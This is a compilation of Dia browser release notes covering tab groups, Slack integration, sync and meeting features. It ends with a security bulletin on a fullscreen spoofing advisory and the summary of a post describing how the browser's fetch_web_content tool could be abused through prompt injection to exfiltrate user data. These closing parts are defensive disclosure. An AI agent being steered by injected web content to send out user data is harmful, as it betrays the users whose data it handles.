children.text: Work happens across tabs, apps, and conversations in the office. At Dia, we’re bringing everything you need—the who, the what, and the where—into your browser, so you spend less time gathering info and more time doing the work you care about. With this release, all that context is one mention away in
Chat

Skip the DMs and search Dia. Just attach the Slack tool to chat, type your question into the search, and watch results come in from your workspace. Get quick summaries and important intel immediately—now you don’t have to comb through Slack to figure out the latest with the feature (the one you heard about in that meeting) that’s kind of like what you’re working on.
Whether you’re using Slack in browser or app, the search works. And this won’t mess with your Slack state—messages won’t be marked as read and your history won’t be saved.
Slack Search
Slack Search Tool in Chat
A few more updates

Alongside our new Slack integration, today’s release brings a few more under-the-hood upgrades to Chat — from better voice input to stronger memory and more. All designed to bring your work and your context, into one place. Seamlessly! Tell us what’s landing with you, and where you want us to go next
Rosey, Engineering Manager
Voice just got better in Dia. We’ve moved to streaming transcription for more accurate recordings and precise punctuation, especially when you’ve got a lot to say. Bring on the long recordings.
Chat now shows each tabs-related tool call—what it read, opened, and closed—and gives you a deterministic way to act on those tabs and URLs. More power, with the receipts.

items.header: See what Chat is doing with your tabs

children.text: Dia now searches memory more reliably, triggering on many more prompts that reference past events or out‑of‑context knowledge. No need for @mentions or exact phrasing—if at first it don't succeed, it'll try, try again.

items.header: Automatic Memory Search is now truly automatic

children.text: My favorite recent read is The Secret Lives of Colour by Kassia St. Clair. It is a fantastic journey through different hues with insights in chemistry, history, politics, religion and art. She magically paints whole worlds of colour in this collection of short consumable essays. The language she uses is so incredibly rich and tactile.

It’s true: at Dia, we often ship things because you’ve asked for them. But sometimes someone on the team just really wants a change, and believes a small fix can unlock a big improvement in your workflow.
Raycast Extension

You can now use AppleScript with Dia, and the first thing it unlocked is a Raycast extension. Starting today, directly open tabs from anywhere, or even use the Raycast focus feature directly with our new extension.

For Raycast users, this will feel instantly natural: you can search your history, hop into work or personal profiles, and pull up any tab without ever leaving your current app. For everyone else, think of it as saving a few clicks dozens of times a day, and avoiding the little distractions that break your flow.

To get the Dia extension, just visit the Raycast Store—
it’s live now
A few more updates

Now you can search memory from the Tab Overflow menu. If you’re not sure where that meeting transcript or invoice is, click the down arrow in the top right to search open or recently closed tabs, or ask Dia to find it in memory.
We’ve added bookmarks to Command Bar search results, and ranked them just like your browsing history. Just start typing in the Command Bar to watch them show up.
We’ve cut down the white flashing that happens during tab switches and navigation. Sites that force white backgrounds may still flash, but we’re exploring a few solutions to squash this bug for good.
Google Meet reminders are now moved into a true PiP window, giving it smoother placement and movement. Drag it with two fingers, snap it to corners, and avoid screen edges automatically.

Our Thanksgiving looked like PJs, kids piled on the couch, and the National Dog Show on full blast. We pick favorites, cheer way too loudly, and pretend we’re judges—especially during the toy group, where we’re undeniably biased thanks to our own rescue pup, Janet.

No grand reveal—for our second release of the week, we’re focusing on simple updates that smooth out daily frictions. And the “what” is just as important as the “why”. In this week’s release, we’ll hear directly from the builders on what they solved, and why they felt the drive to make it happen.
You can now rename tabs in Dia. Just
double‑click

to edit in the sidebar or tab strip and instantly rename anything. Fast, clear labeling means “Draft v3” won’t get confused with “Untitled” ever again. I’ve been working on tab organization lately (more coming soon) and just had to sneak in one of my favorite features from Arc.
Create something new directly from the command bar. Type something like “new doc or "new bug" and Dia starts suggesting quick actions for the tools you use.
Since 99% of my work starts in Dia with
, why not save a bit of cognitive overhead? It was both fun and liberating to identify a pain point in my own daily workflow, realize that many people feel the same pain, and be able to improve it.
Voice input now has a cleaner UI, less clicks, and keyboard shortcuts. You can now hold
⌘T
for a second
anywhere in Dia to open a Voice tab, press
Escape
to cancel, return to stop, and
⌘Return
to send.
When I can speak instead of type, Dia feels more like a real assistant or partner. It makes brainstorming more fluid, letting me express ideas almost like in a conversation.

Today, you can see recent mentions, unread messages, and notifications directly in Dia to triage fast and keep context intact. Ask Dia to pull messages and files without marking them read or saving anything to Slack.
For me, reactions are my favorite part of Slack… and I wanted to be able to ask what I said that prompted the most reactions. It exposes a fun and playful part of getting work done

items.header: Do more with Slack and Dia

children.text: Lately I've been loving going back to the things that I loved to do when I was a kid, not because they are "productive" or something to cross off the to-do list. Last weekend, this looked like searching for cool seashells and stones in the sand at the beach. Finding this gorgeous sand dollar reminded me of joy that exists in little moments.
A few tabs, a busy work day, and your browser can start to feel unruly. To be honest, Dia hasn’t really helped here yet… but that changes today.
This release is our first step toward making Dia your own—with a new tool that brings order and makes your surface truly yours. It may look familiar, but it works in a way that’s unmistakably Dia.
Introducing Tab Groups
You can now group your tabs. By project, by initiative, or however you organize your work.

Whether you’re in the sidebar or the top bar, right click on a tab and move it into a new group. Add and remove tabs from your group with a drag or a click, and quickly collapse or expand it to keep your tab strip tidy.
You can customize each Tab Group with a color and an emoji or icon. When you hover over your tab group, you get a preview of what’s inside the group, and you can always select a tab from there.

When you close a Tab Group, it will automatically move to your bookmark bar as a little “storage” space for your groups. From there, you can relaunch a group anytime—or ⌘ + click to open it in a new window.

Group together the top of mind tabs that you really, really need to have organized. This could be onboarding documentation for your two new hires. Or a GTM initiative with a Figma file, strategy memo, and meeting notes. Or, of course, gift ideas for your office White Elephant party (might we suggest the MoMa store and a pair of socks).
More New Commands.
Following last week’s release, the feedback was clear—more commands, please! Create so much more “new” right from the command bar, like blog, wiki, and jira.
Added by Nathan Chapman.
Book your Resy (and more).
There was a bug where Resy sometimes would not load correctly. We've fixed that so you can get back to booking your reservations.
Fixed by Seb Marchand.
A few more updates

While making the images for this week’s notes, I multitasked at my holiday shopping. High on the list: these red Esmé socks I've heard amazing things about. I used to think socks were a boring gift, now they're basically all I want.

This week’s release is a grab bag of speed and stability. We tied up loose ends to make everyday browsing faster and more predictable, with a mix of fixes you asked for and improvements we’ve been eager to ship. That’s it, that’s the intro.
Tab improvements incoming

Tab Groups (introduced last week, woo!) now get their color from the site’s favicon, or from color matching in the URL bar. It’s not only delightful, the wayfinding helps indicate exactly what’s in your group.
Refined by Dustin Senos
And another calendar update is now live
—see the time to your next meeting, right in your tab. A favorite from Arc, the status will be live in both the sidebar and the topbar to help you never miss a meeting again.
Shipped by Ben Cunningham
Get even more momentum in chat. That means full-context answers, no lost tabs, and progress even when uploads don’t cooperate.
Better chat with your tabs
Dia can now read the entire content in a Google Sheet, not just the visible first 100 rows. That means responses to questions about all content, and connections across sheet
Attachments don’t always play nice. If one won't upload, you don't have to start over or wait—just retry the query without that file and continue the conversation.

Links you click in chat on Ask on Page won't replace your current view anymore. Instead, they'll open a new foreground tab inside your active tab group (when applicable), so you keep your context and keep moving.

items.header: Ask on Page and get a new tab

children.text: I shipped two fixes I’ve been chasing for a while. First, a speculative fix for the “double traffic lights” on macOS—those duplicated window controls that sometimes show up after unlocks or during fullscreen transitions. Please keep an eye out, and let me know if you see it again. Second, I’ve addressed white flashes in dark mode when closing or switching tabs. Notion or Slack received a targeted fix and there’s a true dark background behind their UI now enforced to remove the flashing.
From Miko's Desk
Keyboard shortcuts now respect your layout.
Shortcuts like ⌘Z in Google Docs or Figma now work as expected on non‑US layouts (e.g., AZERTY, Dvorak).
Middle‑click without losing your place.

Back, forward, and reload entries now support middle‑click or ⌘‑click to open in a new tab, so you can explore navigation/history items without replacing your current view. Tabs will open in the background by default, and you can add Shift to open in the foreground.
This one’s for Chromium Users.

If you rely on extensions that use the Chromium side panel (hello, Rovo at Atlassian), Dia now supports them. Since Dia is built on Chromium, compatible extensions can render their side‑panel UI right inside Dia, so your tools show up where you work.
Three more updates

I’ve been looking for music that helps me focus while programming, especially during some recent website updates for Dia Browser. I came across this album in a roundabout way, through an Instagram Reel of Gustavo Cerati (frontman of the Argentine ’80s band Soda Stereo) during a DJ set. That led me down a rabbit hole finding his later work which went more ambient and electronic.
Put this on when you’re ready to deep dive into something.

children.text:
Dia came into the world last year with a simple premise: a browser that lets you chat with your tabs. We've been building on that foundation since then — adding Skills and Memory, bringing back the sidebar, and calendar previews, connecting tools like Slack and email, and closing out the year with Tab Groups. All to help you keep context, stay organized, and move ideas forward.

In 2026, we’ll continue to build Dia as the browser that helps you get things done and move work forward. Expect more ways to organize, better support, better problem solving, and steady improvements that help ideas turn into action.
But first, we’re kicking off the new year with a batch of refinements we polished off in 2025.
Closed tab groups used to be a headache. Now, when there are too many to show in the bookmarks bar, they neatly overflow into a single button.
Everyday improvements to Tab Groups
We also made it easier to tell groups apart and manage them as you go:
Choose either an icon
or
a color to quickly distinguish groups
Creating a group from a tab now adds top-level context menu actions
Command-click–created groups automatically ungroup once only the original tab remains
All small changes, but together, tab groups are now easier to live in. Big thanks to Conner, who snuck all of this in right before the holiday.
No more missing favicons.
Notion fixed the workspace favicon issue, and now all your favicons restore instantly along with your tabs.
Fixes by Luan and Connor
Better ad block coverage.
Updated block lists mean more ads blocked and fewer issues with broken sites.
Updated by Seb
Smoothing out the side panel.
With a refined design, switching between tabs showing different side panels states is now completely flicker free.
Fixed by Seb
Easy to navigate bookmarks.
The bookmark interstitial now shows the full folder tree inline for easier destination selection.
Updated by Connor
Improved list rendering.
Chat can now render lists with correct markers/indentation, avoids lists‑in‑tables, and can auto‑correct slightly off list formatting.
Fixed by Nick
Best effort scraping.
If a page‑load selector never appears, attachments now use a best‑effort scrape instead of timing out.
Fixed by Ali
New year, cleaner edges

In the last two weeks of the year, I took my first real winter vacation in years. It was wonderful. Lots of time with family and friends! I started rewatching Mad Men, went deep on the 1964 World’s Fair in New York (and some nerdy New York history podcasts), went to the gym, and decided I really do like Fred Again. I’m feeling recharged — and newly inspired for 2026. I have a personal aspiration to turn Dia into a browser that the people who write shows like Mad Men, produce nerdy podcasts, and make DJ mixes like Fred Again will want to use.

Meetings tend to scatter things—agendas in one tab, notes in another, a link you’ll need later somewhere else. That makes it harder to stay focused on the most important thing: the conversation. 

Dia now automatically keeps everything you open during a call together in a Meeting Tab Group, so you don’t have to think about where things go while you’re on the call. If you opened it during the meeting, it’s already right where you expect it to be.
Meeting Tab Groups

To get automatic Meeting Tab Groups, you’ll need to pin and authenticate Google Calendar in Dia. Then, when you join a meeting, Dia handles the rest: creating the group, keeping it easy to find, collecting links you open, and cleaning up after the call.
Join a Google Meet from a calendar preview or reminder and Dia automatically creates a Meeting Tab Group.
The group stays anchored to the top of your tabs, and any links from the description or opened from chat—agendas, docs, boards, tickets—are collected into that group as you go.
While the meeting is active, the group includes subtle, meeting specific UI so you can see when the meeting is reasonably close to ending—helping you stay present without clock-watching.
Done with your call? The meeting group becomes a normal tab group, with automatic cleanup, so meeting clutter doesn’t linger.
Chat with a Tab Group

When your work is spread across a dozen tabs, the fastest way to get unstuck isn’t opening one more—it’s getting a clear read on what you already have. That’s why you can now treat a Tab Group as a single bundle of context.

Chat with a Tab Group either by right‑clicking the group and choosing “Chat with Group,” or by attaching the group to a chat. This is useful when you’ve collected a bunch of related tabs and want help using all of them at once. Use it to summarize what’s in the group, pull out key links, or draft a quick update based on what you’ve opened.
This week, I’ve been returning to a classic favorite: Bruce Springsteen’s
Tunnel of Love
. It’s been my favorite album for years—everything hooks me, from the sound and look to the lyrics. If you only listen to one song, make it “Tougher Than the Rest.”

title: Join the call. We’ll handle the tabs.

children.text: Over the last few weeks, we’ve been putting in quiet work to help you get more done with less overhead. This week delivers small improvements to staying organized and using your tabs as context in Dia. So you have a browser that’s there when you need it, and gone when you don’t.
3 ways to get organized

For many of us, a tab is a task waiting to be done. Now you can swap in an icon that matches what the tab is really for. Customize any tab’s icon by right-clicking it and selecting “Change icon…” to make Dia even more your own.

Work, personal, maybe your third job—Profiles help us keep different parts of our lives organized, even if we’re in one browser. Profile theme colors are now more bold in Dia, so it's easy to see where (or who) you are.
Clean out your tabs with less clicks. If you’re closing out your day, hover over a tab group and click the X to close. And you can always find any closed tabs groups in your bookmark bar.
3 ways to use context
Dia now reads more structured content for channels and threads when you attach Slack to a Chat. So you pull in the full conversation, not just the last few chats.
Links are now more visually appealing in assistant responses, with a favicon for the page and a cleaned-up title. Links now also show a hover tooltip that displays the host name and title.
Not all conversations need to be remembered. You can now Delete chat conversations from Chat history with the right click context menu.
Tap in, Tahoe users.

For users on macOS Tahoe, the next Dia release will include a round of visual refinements just for you. We’ve tightened up details like window and menu corner radii, and launched a new Tahoe glass-style Dia icon that responds to your Tahoe appearance.
Designed by Jess Wang, Shipped by Chris Yim
F12 to open.
We now support F12 to toggle Developer Tools (matching Chrome), and have updated shortcuts to allow binding of function keys (F1–F12).
Updated by Chris Yim
Content blocker changes apply instantly.
Toggling the content blocker on a page automatically reloads it—and if you have unsaved changes, we’ll ask you to confirm before we do.
Fixed by João Neves
Hand off your Tabs.
If Dia is your default browser, when you're at your laptop and have a tab open on your iPhone, Dia's icon will show up on your macOS dock (allowing you to quickly open the URL on Desktop).
Shipped by Connor Montgomery
A few more updates
Want to get featured in our release notes someday? We’re assembling a diverse group of craft-obsessed people for
these open roles
. People from all backgrounds are encouraged to apply, and even if you don’t see an exact fit you can always still join our
talent community

Lately, I’m most excited about how our tab management story has evolved. We’ve gone from users having little to no organization (and asking for it) to being able to organize in ways that match their own complexity. A lot of this power isn’t pushed—features like pinning are there if you want to reach for them. It feels easier to pick up than what we did in Arc, because it grows with you instead of being forced upfront.
We’ve got a bunch of people joining us in the coming weeks—here's how they might get started using our latest release.
Dustin, Head of Design
Dia from Day One
On your first day at The Browser Company, you get an onboarding doc, filled with things to know, down to the WiFi password for the office.
-Click
when you open links from the onboarding doc to automatically get a new tab group with that doc, and all the links you open from it. Every relevant link for will be together in one place.
You’re in a meeting with your manager, and want to show up prepared. You can now
Pin a Tab Group

to keep it in one spot, no matter how many tabs you open. Pinned groups sync across all windows within each profile, and persist even if you close a window or restart Dia, so you’ll always know where Onboarding is.
You’re starting to write up strategy, but need to reference some materials you saw earlier in the week. Just attach the Onboarding Tab Group to any chat, and ask for what you need.
Attaching a Tab Group
brings more context from your tabs into Chat, getting you answers fast.
You’ve made it through your first week, and you’re starting to get the hang of things.
Close out
by click the X of the Tab Group. You can always find it again in the recently closed menu or History.
Also important—we've added
Tab panel in Settings
. Our defaults are strong, but opt out if something doesn’t work for you. And you can always change once you’re onboarded.

Starting in next week's release, 1.17, Dia will stop supporting Manifest V2 extensions. Any V2 extensions you’ve installed will stop working and display a “no longer supported” message.

Dia’s built‑in ad blocker remains on by default, and most popular extensions update to Manifest V3 automatically. This brings Dia in line with other Chromium‑based browsers and removes reliance on deprecated, less secure code paths.

Engineers, you know how it goes: you open a PR, wait for reviews, then merge. But then PR notifications get buried under email, calendar, chat, and other pings, and you have to go digging for them. That is, until this week, with the release of
Live Tab Groups
We're starting with GitHub, but this is the first
Live Tab Groups
launch of many. All designed to keep your most important work front and center in Dia.
Github Live Tab Groups
Now, the moment you open a pull request, Dia creates a
GitHub
Live Group
in your sidebar. No set up required, simply create your PR.
The first time, you’ll see a quick introductory popover explaining what’s new. The
Live Tab Group
shows both the pull requests you’ve opened, and ones waiting on your review. It stays pinned by default, so your work is always visible even as you hop into meetings or switch projects.
New pull requests appear when you open them, and closed or merged ones drop off, so you’re not maintaining a mental or manual checklist.

items.header: As work moves forward (or merges), the Live Tab Group updates itself.

children.text: No cleanup required.

items.header: When pull requests close, they leave the Live Tab Group automatically.

children.text: If Dia is unable to fetch the latest status from Github, there will be a visual cue to reauthenticate. That way, instead of refreshing and wondering what’s wrong, you know exactly what to do to get things syncing again.
Prefer a more hands-on approach? A dedicated right-click menu lets you refresh the
Live Tab Group
and configure what repos or PRs show up.
All of this means less time tracking down links, digging through your PR page, or remembering which PRs are still on you. And of course, more time to actually review and ship changes.
Help us build what's next

GitHub is just the beginning. At Dia, we want to reflect the reality of how you move across tools. We know that looks different for everyone, so we’re running a short survey to figure out what to bring you next.
Tell us which tools you want to see live and updating in Dia →

Everyone's Dia looks a little different: what you keep pinned, what you bookmark, and how quickly you move. This week’s release focuses on making your space behave the way you want (and need it to). With improvements to layout, organization, and performance, Dia moves with you as your setup evolves.
Creating a Tab Group is usually intentional: You have a project, a theme, or something you want to return to. Dia now reflects that by
automatically pinning new tab groups

when they’re created.

This keeps important groups anchored in your tabs (kinda like how Folders worked in Arc 👀) and reduces the need to constantly reorganize as your tab list grows.
Accidentally closing a window shouldn’t mean losing your tabs, your hard work, or your customized set up.
You can now reopen a closed window from the File menu and get all of your tabs back in
one click
. No digging through your history or manually reopening tabs one by one required!

The Bookmarks Bar now only shows Tab Groups you’ve explicitly closed and moved there. Before, it showed all Tab Groups, even ones still open in other windows. Now, what you see reflects your intent—plus, it keeps your setup tidy and easier to manage.

items.header: A cleaner, more intentional Bookmarks Bar

children.text: When you’re organizing your space visually, even the little layout details matter. Groups now display more cleanly and predictably.
We fixed a tab truncation issue in the Tab Strip when Tab Groups are present to improve spacing and label clarity.
When you’re switching contexts (or going undercover 🕵️), visual cues matter. Incognito windows now launch in
dark mode by default
. This makes it easier to recognize where you are, especially when you’re moving quickly between windows.
Startup is now significantly faster on lower-spec machines!

We found that large favicon caches could grow to tens of thousands of entries over time, which slows down startup on machines with limited memory or slower storage. By capping the cache at 1,000 entries (more than enough for everyday use) launch is now nearly instantaneous after the first run.
Performance Updates
That’s it for this week. What’s one small change that’s made your setup work better for you? Tweet us the answer and we’ll include it on a future release note!

What starts as research becomes planning. Planning becomes bookmarks you’ll never revisit. And a few tabs suddenly become 50. All the information you need to ace your big proposal is technically there, but nothing feels together.
Tab Groups
help, but only if you actually name and manage them. And when you’re 50 tabs deep, that’s when they slow you down and break focus.
Starting today, Dia handles the naming, so you don’t have to.
With
Automatic Tab Group Names,
if you don’t set a manual name, Dia generates one based on what’s inside the group (topics, content, similarity) and what Dia already knows about you.

items.header: Never Name a Tab Group Again

Dia organizes your workspace as you go—it doesn’t make you pause to tidy up.
And organization doesn’t stop with your tabs.
Ever opened a new tab and thought,
“Wait, what was I supposed to do?”
Now, Dia won’t wait for you to ask. With
Proactive Suggestions
, Dia pulls the context across your calendar, email, Slack, and tabs into a daily morning briefing of what needs your attention from the jump.

We’ve been asking how you actually work—and what breaks your momentum. What we heard wasn’t big blockers, but constant competition for your attention: a calendar invite colliding with an email, a Slack message pulling you from an important tab. That steady context switching fragments your focus and slows you down. This is where
Proactive Suggestions
come in.
Momentum Matters
Starting now, when you open a new tab in Dia in the morning, you’ll see a set of personalized suggestions.
Instead of juggling reminders and tasks in your head, you can put your energy into the work itself.
Proactive Suggestions

keep priorities visible and actionable, so your day doesn’t stall between tasks. Now you can review your notes before that big meeting, polish that presentation, crush that deadline…the (to-do) list goes on.
If Dia surfaces something you’re not quite ready to tackle, you can dismiss suggestions or let them fade away naturally.
And if you’d prefer a clean, new tab page, you can turn off Proactive Suggestions anytime in Personalization settings.
Now that the noise is out of the way, what will you tackle first?

I highly recommend this as a shared activity for your next group trip to slow down and build something beautiful together.

children.text: This week, Dia finds its rhythm, and (as always) helps you find yours.

Music is the backdrop to our work days here at the Browser Company. It sets the pace, shapes the mood, and keeps us inspired through our 9-5. Until now, changing your soundtrack meant leaving your current tab—talk about a record scratch.
Starting today, when you hover over your pinned Spotify tab, the
Spotify Mini Player
appears. Pause, skip, or check out what’s playing, all without leaving the page you’re on.
Spotify Mini Player
When your music plays, animated music notes dance around the Spotify icon. It’s subtle, but it’s almost like your browser
feels
your playlist, too.
Here’s a little magic:
Rhythm isn’t just limited to music, though. It’s also about how your browser moves with you.
When you’re working across two panes, flow matters just as much as your soundtrack.
Split View
now gives each pane its own navigation controls and address bar, so it’s clearer which side you’re interacting with. Each pane practically behaves like its own window.
Split navigation gets its own independent controls

You can also move through each pane independently and swap panes to keep the right content in focus, or in the order that works best for you. Compare, reference, or work across two contexts without losing your place—or missing a beat.
Split View changes the composition, but the next few updates change how Dia feels.
Not every change has to be static.
Now, when Dia names a tab group for you, it shimmers into place.
Sometimes you want everything in view. Sometimes you don’t.
You can now hide or show your sidebar tabs using a new toggle next to the navigation controls.
Are these loud changes? No, but you
ll feel them. And if you don't, tell us more about the way you work so we can build more features for your specific set up!
If you’re using the
Spotify Mini Player

children.text: You told us Dia was feeling sluggish, and you were right. So, we’ve released a series of thoughtful improvements that make everything feel lighter (and faster). You should already feel some of this, but we’re not finished just yet.
Here’s what we’ve done so far:

Keep your Dia open for days, and it might start lagging. Or at least, it used to thanks to memory leaks. We found a few places where memory wasn’t being released properly—plus a platform bug that kept some views around after switching tabs. In some cases, that added up to gigabytes of extra memory.
No more slowing down over time
Now that's fixed, Dia should feel more speedy (even if you rarely restart your laptop 👀).
Some smaller things that were adding up
Animations on the new tab page now use fewer resources. We tuned when they run to reduce CPU and GPU usage — small savings that add up, especially when other tabs are busy.
The command bar is faster. By moving work out of the suggestion path and warming up favicon and database caches at startup, results show up more quickly as you type.
And now, if your system is under load, we skip the extra step that decides whether input goes to search or Dia—saving resources when your machine needs it.
The best way to help us keep improving Dia is by
joining our
Early Birds program
. When you join Early Birds, you’ll get early access to new features and fixes—and you’ll also get a direct line to provide us feedback on your experience.
The work doesn't stop there
Go to Help → Record a Performance Issue.
Pro tip:
Include a description of what feels off and make sure the issue actually happens while you're recording ,so we capture it (and fix it)!

items.header: If you hit a performance issue

children.text: You can also tweet your feedback to us
@diabrowser
. Speaking of, we’d like to shout out
@qbmgabriel
and
@alymoursy

. They didn’t just report performance issues but followed up with videos, tested our fixes, and helped us validate that things were actually getting better. That’s the type of collaboration we love here at BCNY.
If something feels better, we’re glad. If something still feels off, tell us! We’re always trying to make Dia better (and faster), and you’re a big part of that.
That’s it for this week.

Lately I’ve been deep in apartment renovations—measuring, rearranging, second-guessing every detail. I’ve been reworking a third bedroom into a karaoke/office situation. It’s now covered in anime prints, D&D art, and a growing Beyoncé vinyl collection. It’s still a work in progress, but it already feels more like how we actually live: with an emphasis on entertainment!
Over the past six months, hundreds of you have made it clear:
I love Dia, but I can’t make it my default browser. At least, not until my stuff follows me.
Starting today, you can bring Dia with you:
Sync
has arrived. Now you can access your favorite parts of your browser, no matter where you are.
These two Dia instances are synced to show you what it looks like across separate machines
Sync sounds simple: all of your stuff, on another machine. But it’s far more complicated than that.
What happens when you rename a tab group on your laptop and delete it on your desktop before they’ve talked to each other? All your stuff, your setup, your profile—gone. You have to start over.

To solve this, we couldn’t just throw everything into a database somewhere. Your data stays encrypted and local-first, which means there’s no server that knows the “right” answer when two machines disagree.
Getting Sync to
just work
meant solving thousands of tiny collisions. But we did it. Sync brings your browser with you—not just the app, but everything you rely on inside it. Now, we can’t wait for you to try it out.
Luan, Software Engineer
How to set Sync up
Go to
Settings → Sync.
Turn
Sync

on.

You’ll be asked to accept the privacy policy—this allows your data to move with you, while staying encrypted and local-first.

title: Pick up where you left off

children.text:
You’re in a meeting, and someone asks, “did you see the doc I shared?” You didn’t. 

We’ve all been there: a comment you missed, a page you never saw, a doc you made weeks ago that’s suddenly back in play.
What if you didn’t have to go looking for that work at all? What if it came to you?
We started with GitHub, but today, Live Work goes beyond code.
Live Docs
is a new Live Tab Group that surfaces your active Notion pages and Google Docs in one place.
Live Docs
pulls in comments, suggestions, mentions—all the “hey, can you look at this?” moments—and brings them to you. One group, no tab wrangling.
Introducing Live Docs

Your docs appear when there’s activity, like a comment, a mention, or a share. Plus, they link straight to the change, not the top of the page so you can jump right in. Once you’ve handled it, the doc fades out. Clear the last one, and your group goes quiet. That empty state? You earned it.
When your doc starts getting traction,
you’ll know
Live Docs
shows viewer counts on shared pages—so when your proposal has “5 viewers today,” you know it’s making the rounds.

items.header: Know when your work is landing

children.text: With GitHub, we brought live work to engineers. With
Live Docs
, we’re bringing it to everyone whose work lives in documents.
Your work comes to you, stays in your line of sight while it matters, and cleans up when it’s done.
Live Work is expanding
I took photography classes in high school and recently decided to get back into it! I purchased
a refurbished Pentax K1000

film camera and have been having a lot of fun testing out different film. I normally take digital photos, but film really makes you pick your shot, and it has been really refreshing. I recently took a bunch of photos while traveling in Kauai; the one here is of the Napali Coast!

Open Dia this week and it might look the same. But take a closer peek, and you'll notice—things are tidier, quieter, more considered. This week’s updates don’t announce themselves, but once you start noticing them, your Dia experience is
that
much better.
Spacing is tighter, labels are clearer, and the font size is a bit bigger and easier to read. It’s the same sidebar you know, just cleaner, calmer, and easier on the eyes.
The Tab Switcher got an updated layout with new colors and shadows. The switcher now hides tabs you haven't visited in a while. So when you press
Ctrl+Tab

Dia should feel less like a frame around your content and more like an extension of it. The top band of your browser now picks up the color of the site you're visiting, and keeps up as the page changes beneath it, even after you scroll.
With Sync, your settings now follow you. Set your Tabs, Privacy, Profiles, Memory, Shortcuts, and more on one machine, and they're already waiting on the other. One Dia, every device.
Preferences that travel with you
Sometimes the best updates are the ones that make everything feel a touch better. Drop us a line on
Twitter

Ever open a bunch of tabs on one laptop, then switch to a different one and wish they were there too? Now they are. All your unpinned tabs sync automatically across every device you're signed into.
Just open the Tab Overflow menu and you'll see a section with tabs from your other devices. No setup, no extra steps. Just your tabs, there when you need them.

Your browser should feel like a clean desk. Everything where you need it, and nothing in the way. This week, we tuned how Dia handles your tabs.

Switching, closing, and jumping between tabs all feel snappier this week. We reworked how Dia tracks open tabs and moved cleanup work into the background so nothing stutters when you’re in the middle of things. It’s faster when you’re moving and quieter when you’re not.

⌃ + Tab

We’re all constantly doing the dance. You’re multitasking in a meeting (or watching a video) with our nice picture-in-picture window, you go to read something underneath it, and then you spend the next five minutes dragging that window around the screen trying to find a spot where it isn't in the way.

Now, you can stash it. Drag a video or meeting PIP window off to the side of your screen and it sits neatly out of the way, still one click (or drag) from coming back into view. Keep your video close by, without sacrificing the screen real estate.
⌘-S to zone in.
In case you didn’t know, using the keyboard shortcut command-s hides your tab bar, so you can really zone in on whatever you’re working on. Tap command-s again to bring it back!
⌘-Click to stick together.

The next time you’re diving deep on a research kick, use command-click to select all the tabs you just opened, and then right click to turn them into a tab group. Once the group is opened, Command-Option-T creates a new tab inside the group, so you can keep all your research in one place!
Meeting Tab Groups reduce the scatter.

When you join a meeting (from a calendar preview or meeting reminder), Dia auto-creates a dedicated tab group for that meeting and keeps the meeting tab anchored so it’s easy to find.⁠⁠ As you open meeting-related links (invite links, agenda/docs/boards/tickets, etc.), Dia drops them into that same meeting’s group so everything for the call stays together.
Other ways to stay focused with Dia

children.text: Starting today, we're rededicating this space to highlighting the newest and most exciting features that we're building. Some of you are already using these features. Some of you have heard whispers. Some of you typed in a secret code and never quite figured out if it was on.

The industry is selling a life with nothing left in it for you to do. An agent to work on your behalf, an assistant to decide on your behalf, a day smoothed down until it asks nothing of you and gives nothing back.
We were founded on a different premise.
We believe in making good work
feel

good, and that life is better when you demand more from it, friction and all, rather than having it automated away. That's why we're showing you our latest, unfiltered, sometimes-rough-around-the-edges features this summer.
Starting with better mornings...

Mornings are their own small defeat. You open the laptop and it's all already waiting: the forty tabs you left for some better-rested version of yourself, the thread that reached a decision without you, the email you've put off so long that answering it now is practically a confession. It makes you want to scream. We think it shouldn't have to feel like that, so we built the
Morning Brief
It remembers what slipped through the cracks, what deserves your focus, and quiets the storm long enough for you to start the day on your terms.
Go into
Settings > Apps
and turn
New Chat
on. Connect your tools and you'll receive your first one tomorrow. (We need Slack at a minimum, but connect more for a richer brief!)
Things may not be perfect, they may break, and crash, and give you wonky outputs, so we're excited to explore the friction with you.
More next week!

children.text: Ask Dia to draft a plan, chart the data behind a decision, or make sense of a long Slack thread, and now it hands you back a Report: beautifully designed document you can make sense of quickly, tweak to perfection, and share with your team.

For a quick question or a fast back-and-forth, chat is still there. Reports are simply what Dia reaches for when what you asked for needs to be more digestible and presentable. Here are three prompts to try:

Looking at Amplitude, make a report charting key app metrics that we outlined in Notion last week.

Dia gets you most of the way there, but the finishing touches are still yours. Here's how you can tweak and organize your Reports so that you can actually use them in your day to day.
Made for real work

children.text: We know you love Arc. But have you met the new Dia?
Reading our release notes in another browser?
Hi there,
Cory
here! I’m the Head of Security at The Browser Company. With the general availability of Dia being announced, the security team is introducing Dia’s Security Bulletin page.

Security has been at the core of how we built Dia. Being an AI Browser introduces novel security considerations—from prompt injection and model supply chain risks to client hardening and safe integrations. We’re committed to transparent, actionable communication when there’s something users or admins need to do.
This page will host:
Advisories:
Clear guidance on vulnerabilities affecting Dia and steps to remediate.
CVE Notices:
Disclosures aligned with our CNA policy and assignment process.
Security-impacting Release Notes:
Highlights of patches, mitigations, and hardening work.
Enterprise Updates:
Admin controls, policy changes, and audit-related information.
Publishing cadence will be event-driven: when there’s user- or admin-action to take, you’ll see it here first, with severity, affected versions, and fix paths.
If you believe you’ve found a security issue, please report it through our bug bounty program or responsible disclosure channels listed on the
Dia Security Center.
Thank you for helping us keep users safe.
Summary
: Increased Spoof Risk in affected MacOS versions of Dia
CVE ID
Advisory Release Date
: Fri, Nov 21, 2025
Affected Versions:
Dia versions <1.6
Severity
: High
Details

This vulnerability allowed a site to enter fullscreen without a full-screen notification (toast) appearing. Without this notification, users could potentially be misled about what site they were on if a malicious site renders a fake UI (like a fake address bar.)
In Dia versions ≥1.6, the fullscreen notification (toast) is now enabled in all scenarios, informing users in a transition to fullscreen and making spoof attempts visible.
Severity

The Browser Company rates this issue High with a CVSS v3.1 base score of 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N). This reflects our internal assessment—please evaluate applicability within your environment.
Affected Versions
Dia on MacOS versions <1.6
What do I need to do?
Update Dia to the latest available version. Any version 1.6 or newer contains the fix.
Credit
The Browser Company thanks @frozzipies for reporting this issue through our
vulnerability rewards program

children.text: How we built a powerful feature, discovered it could be exploited, and rebuilt it from the ground up with security at its core.
TL;DR
This post tells the story of
fetch_web_content

, a tool that lets Dia retrieve information from the web on your behalf. We built it, discovered it could be exploited for data exfiltration via prompt injection, spent months trying to secure it with detection-based approaches, and ultimately concluded that detection wasn't enough. We made the difficult decision to remove the feature before Dia's public beta in June 2025. Two months later, we brought it back—rebuilt from the ground up with architectural controls that remain secure even when prompt injection occurs.

